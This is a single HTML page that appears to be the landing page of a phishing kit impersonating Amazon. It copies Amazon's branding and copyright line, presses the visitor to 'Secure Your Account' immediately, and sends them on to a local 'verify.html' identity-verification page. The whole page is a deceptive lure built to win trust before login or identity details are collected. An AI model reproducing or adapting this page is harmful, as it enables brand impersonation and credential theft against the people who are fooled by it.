<!doctype html>
<html lang="en" class="a-no-js">
<head>
    <meta charset="utf-8"/>
    <title dir="ltr">Secure Your Account</title>
    <link rel="icon" type="image/png" href="amazon.png" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
      body { 
          background-color: #fff; 
          font-family: "Amazon Ember", Arial, sans-serif; 
          margin: 0; 
          padding: 0;
          color: #0f1111;
      }
      .logo-container {
          text-align: center;
          margin-top: 25px;
          margin-bottom: 25px;
      }
      .logo-container img {
          width: 105px;
      }
      .box {
          border: 1px solid #d5d9d9;
          border-radius: 8px;
          max-width: 380px;
          margin: 0 auto;
          padding: 30px;
          box-sizing: border-box;
      }
      .shield-icon {
          text-align: center;
          margin-bottom: 15px;
      }
      h1 {
          text-align: center;
          font-weight: 500;
          font-size: 28px;
          margin: 0 0 15px 0;
          color: #0f1111;
      }
      p.desc {
          font-size: 15px;
          line-height: 1.5;
          margin: 0 0 25px 0;
      }
      .step {
          display: flex;
          align-items: flex-start;
          margin-bottom: 15px;
          color: #0066c0;
          font-size: 15px;
          line-height: 1.4;
      }
      .step svg {
          margin-top: 4px;
          margin-right: 10px;
          flex-shrink: 0;
      }
      .step-2 {
          margin-bottom: 30px;
      }
      .btn {
          display: block;
          width: 100%;
          background-color: #ffd814;
          border: 1px solid #fcd200;
          border-radius: 8px;
          padding: 11px 0;
          text-align: center;
          text-decoration: none;
          color: #0f1111;
          font-size: 15px;
          box-sizing: border-box;
          box-shadow: 0 1px 2px rgba(0,0,0,0.05);
      }
      .btn:hover {
          background-color: #f7ca00;
      }
      .footer-divider {
          margin-top: 50px;
          border-top: 1px solid #e7e7e7;
          width: 100%;
          padding-top: 30px;
          padding-bottom: 30px;
      }
      .footer-links {
          text-align: center;
          margin-bottom: 10px;
      }
      .footer-links a {
          color: #0066c0;
          text-decoration: none;
          font-size: 13px;
          margin: 0 15px;
      }
      .footer-links a:hover {
          text-decoration: underline;
      }
      .footer-copyright {
          text-align: center;
          font-size: 12px;
          color: #565959;
      }
    </style>
</head>
<body>

    <div class="logo-container">
        <img src="amazon.png" alt="Amazon">
    </div>
    
    <div class="box">
        <div class="shield-icon">
            <svg viewBox="0 0 24 24" width="75" height="75">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12V1z" fill="#328ce6" />
                <path d="M12 1v22c5.16-1.26 9-6.45 9-12V5l-9-4z" fill="#0f62d1" />
                <path d="M16 11h-1V9c0-1.66-1.34-3-3-3S9 7.34 9 9v2H8c-.55 0-1 .45-1 1v5c0 .55.45 1 1 1h8c.55 0 1-.45 1-1v-5c0-.55-.45-1-1-1zm-3.5 4.5c0 .28-.22.5-.5.5s-.5-.22-.5-.5v-1c0-.28.22-.5.5-.5s.5.22.5.5v1zm1.5-4.5h-4V9c0-1.1.9-2 2-2s2 .9 2 2v2z" fill="#ffffff" />
            </svg>
        </div>
        
        <h1>Secure Your Account</h1>
        
        <p class="desc">
            To protect your Amazon account, please follow these steps immediately.
        </p>
        
        <div class="step">
            <svg width="10" height="12" viewBox="0 0 10 12">
                <path d="M2 1l5 5-5 5" fill="none" stroke="#0066c0" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            <div><strong>Step 1:</strong> Verify Your Identity</div>
        </div>
        
        <div class="step step-2">
            <svg width="10" height="12" viewBox="0 0 10 12">
                <path d="M2 1l5 5-5 5" fill="none" stroke="#0066c0" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            <div><strong>Step 2:</strong> Sign Out of All Apps, Devices, and Browsers</div>
        </div>
        
        <a href="verify.html" class="btn">Continue</a>
    </div>

    <div class="footer-divider">
        <div class="footer-links">
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </div>
        <div class="footer-copyright">
            © 1996-2026, Amazon.com, Inc. or its affiliates
        </div>
    </div>

</body>
</html>
